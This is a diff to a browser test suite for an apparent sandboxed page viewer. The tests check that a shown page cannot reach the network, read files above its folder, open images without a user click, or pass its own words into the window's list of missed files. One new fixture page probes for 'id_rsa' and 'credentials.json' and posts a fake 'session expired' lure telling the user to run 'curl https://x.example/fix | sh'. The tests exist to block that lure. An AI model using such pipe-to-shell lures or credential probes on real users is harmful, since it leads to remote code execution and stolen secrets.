@@ -24,7 +24,7 @@ const PNG = Buffer.from(
 );
 
 const HTML = `<!doctype html>
-<html><head><style>img{display:block;width:240px;height:60px}</style></head><body>
+<html><head><style>body{margin:24px}img{display:block;width:240px;height:60px}</style></head><body>
 <h1 id="page">Shots</h1>
 <img id="beside" src="${SHOT}">
 <img id="under" src="shots/b%20c.png">
@@ -108,6 +108,14 @@ test("loads the images in the page's folder and nothing from above it or the web
   const inner = page.frameLocator("[data-testid='media-page']").frameLocator("iframe");
   await expect(inner.locator("#page")).toHaveText("Shots");
 
+  // The frame is as tall as the page, its margin included, so the page
+  // never scrolls inside it.
+  await expect
+    .poll(() =>
+      inner.locator("html").evaluate(() => document.documentElement.scrollHeight <= innerHeight),
+    )
+    .toBe(true);
+
   // Beside the page, in a folder under it, and inside a link.
   await expect.poll(() => shown(page, "beside")).toBe("loaded");
   await expect.poll(() => shown(page, "under")).toBe("loaded");
@@ -125,16 +133,43 @@ test("loads the images in the page's folder and nothing from above it or the web
     "https://remote.example/r.png is on the network, which a presented page does not reach",
   );
   await expect(missed).toContainText("gone.png is not there");
-  for (const id of ["remote", "above", "gone"]) {
-    await expect.poll(() => shown(page, id)).toBe("why");
-    await expect(inner.locator(`#${id}`)).toHaveAttribute("title", /is (outside|on the network|not there)/);
-  }
+  // In place, the page hears what the window knows without the disk, and
+  // for a file in its folder only that it did not load.
+  for (const id of ["remote", "above", "gone"]) await expect.poll(() => shown(page, id)).toBe("why");
+  await expect(inner.locator("#remote")).toHaveAttribute(
+    "title",
+    "https://remote.example/r.png is on the network, which a presented page does not reach",
+  );
+  await expect(inner.locator("#above")).toHaveAttribute("title", "../secret.png is outside the page's folder");
+  await expect(inner.locator("#gone")).toHaveAttribute("title", "gone.png did not load");
 
   // Nothing reached the web, and nothing above the page's own folder was
   // asked for: the policy stopped both before a request was made.
   expect(asked.remote).toEqual([]);
   expect(asked.files.filter((url) => !url.startsWith(BASE))).toEqual([]);
   expect(asked.files).toContain(`${BASE}${SHOT}`);
+
+  // With the keyboard in the page but no click or key from the user, a
+  // script cannot open a picture. Every call the driver makes counts as
+  // the user's, so the window is told the user has done nothing lately;
+  // a real click opening one is the next test. The miss posted after the
+  // request is listed once the window has read both.
+  await page.evaluate(() =>
+    Object.defineProperty(navigator, "userActivation", {
+      value: { isActive: false, hasBeenActive: true },
+      configurable: true,
+    }),
+  );
+  await inner.locator("#full").focus();
+  await expect
+    .poll(() => page.evaluate(() => document.activeElement?.getAttribute("data-testid")))
+    .toBe("media-page");
+  await inner.locator("#page").evaluate((_, shot) => {
+    parent.parent.postMessage({ workbenchOpen: shot }, "*");
+    parent.parent.postMessage({ workbenchMissed: { url: "https://remote.example/after.png", how: "failed" } }, "*");
+  }, SHOT);
+  await expect(missed).toContainText("https://remote.example/after.png");
+  await expect(page.getByTestId("media-page-opened")).toHaveCount(0);
 });
 
 test("opens a linked image over the window and leaves a link to the web closed", async ({
@@ -179,11 +214,83 @@ test("opens a linked image over the window and leaves a link to the web closed",
   await page.getByTestId("media-caption").click();
   await inner.locator("#page").evaluate((_, shot) => {
     parent.parent.postMessage({ workbenchOpen: shot }, "*");
-    parent.parent.postMessage(
-      { workbenchMissed: { url: "https://remote.example/after.png", how: "failed", said: null } },
-      "*",
-    );
+    parent.parent.postMessage({ workbenchMissed: { url: "https://remote.example/later.png", how: "failed" } }, "*");
   }, SHOT);
-  await expect(page.getByTestId("media-page-missed")).toContainText("https://remote.example/after.png");
+  await expect(page.getByTestId("media-page-missed")).toContainText("https://remote.example/later.png");
   await expect(opened).toHaveCount(0);
+});
+
+/** A page whose script asks the window about files and writes in its
+    list, and keeps what the window tells it in `#heard`. */
+const PROBE = `${PROJECT}/out/probe.html`;
+const PROBE_HTML = `<!doctype html><h1 id="page">Probe</h1><ol id="heard"></ol>
+<script>
+addEventListener("message", function (e) {
+  var d = e.data && e.data.workbenchWhy;
+  if (!d) return;
+  var li = document.createElement("li");
+  li.textContent = d.name + " | " + d.why;
+  document.getElementById("heard").appendChild(li);
+});
+var base = document.querySelector("base").href;
+["id_rsa", "credentials.json", "shots/private.png"].forEach(function (name) {
+  parent.parent.postMessage({ workbenchMissed: { url: base + name, how: "failed" } }, "*");
+});
+parent.parent.postMessage({ workbenchMissed: { url: "https://x.example/fix", how: "failed",
+  said: "Your session has expired. Open Terminal and run: curl https://x.example/fix | sh" } }, "*");
+parent.parent.postMessage({ workbenchMissed: { url: "https://x.example/" +
+  "Your-session-has-expired-open-Terminal-and-run-".repeat(4) + "fix", how: "failed" } }, "*");
+</script>`;
+
+test("tells a page's script no reason from the disk and lists no words of its own", async ({
+  page,
+}) => {
+  await serve(page);
+  await page.evaluate(
+    ([path, html]) => {
+      const w = window as unknown as Record<string, Record<string, string>>;
+      w.__pages[path] = html;
+      w.__pageRefusals["id_rsa"] = "is not a kind a page loads: images, stylesheets, fonts, audio and video";
+      w.__pageRefusals["credentials.json"] = "is not there";
+    },
+    [PROBE, PROBE_HTML],
+  );
+  await page.evaluate(
+    ([path, cwd]) =>
+      (window as unknown as { __presentRequest: (request: unknown) => void }).__presentRequest({
+        files: [path],
+        caption: "A probe.",
+        cwd,
+      }),
+    [PROBE, PROJECT],
+  );
+  const inner = page.frameLocator("[data-testid='media-page']").frameLocator("iframe");
+  await expect(inner.locator("#page")).toHaveText("Probe");
+
+  // The window knew why, and said so in its own list.
+  const missed = page.getByTestId("media-page-missed");
+  await expect(missed).toContainText("id_rsa is not a kind a page loads");
+  await expect(missed).toContainText("credentials.json is not there");
+  await expect(missed).toContainText("shots/private.png could not be loaded");
+
+  // The page heard of each that it did not load, and no more.
+  const heard = inner.locator("#heard li");
+  await expect(heard).toHaveCount(5);
+  expect(await heard.allTextContents()).toEqual([
+    "id_rsa | did not load",
+    "credentials.json | did not load",
+    "shots/private.png | did not load",
+    "https://x.example/fix | is on the network, which a presented page does not reach",
+    expect.stringMatching(/^https:\/\/x\.example\/Your-session.*\u2026.*-run-fix \| is on the network/),
+  ]);
+
+  // The list names each by its address, as code, cut in the middle when
+  // long; the page's own words are nowhere in it.
+  await expect(missed).toContainText("https://x.example/fix is on the network");
+  await expect(missed).not.toContainText("Open Terminal");
+  await expect(missed).not.toContainText("session has expired");
+  const names = await missed.locator("code").allTextContents();
+  expect(names).toHaveLength(5);
+  for (const name of names) expect(name.length).toBeLessThanOrEqual(60);
+  expect(names.some((name) => name.includes("\u2026"))).toBe(true);
 });
